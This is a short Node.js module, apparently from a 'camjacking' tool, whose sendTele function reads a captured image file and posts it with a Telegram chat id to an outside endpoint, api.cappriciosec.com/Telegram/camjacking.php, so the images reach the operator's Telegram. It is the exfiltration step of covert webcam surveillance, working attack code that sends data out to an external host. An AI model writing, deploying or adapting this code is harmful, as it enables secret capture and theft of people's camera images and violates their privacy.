const axios = require('axios');
const FormData = require('form-data');
const fs = require('fs');
const path = require('path');
const chat = require('./config');

module.exports = {
    sendTele: async function(imagePath) {
        try {
            const chatid = await chat.getChatId(); 
            if (!fs.existsSync(imagePath)) {
                console.error('File does not exist:', imagePath);
                return;
            }

            const imageStream = fs.createReadStream(imagePath);

            const form = new FormData();
            form.append('image', imageStream);
            form.append('chatid', String(chatid)); 
            axios.post('https://api.cappriciosec.com/Telegram/camjacking.php', form, {
                headers: {
                    ...form.getHeaders(),
                },
            })
            .then(response => {
                console.log('File Sent successfully: Check Telegram DM');
            })
            .catch(error => {
                console.error('Error Sending file: Add Chat ID');
            });

        } catch (error) {
            console.error('Error creating read stream:');
        }
    }
};
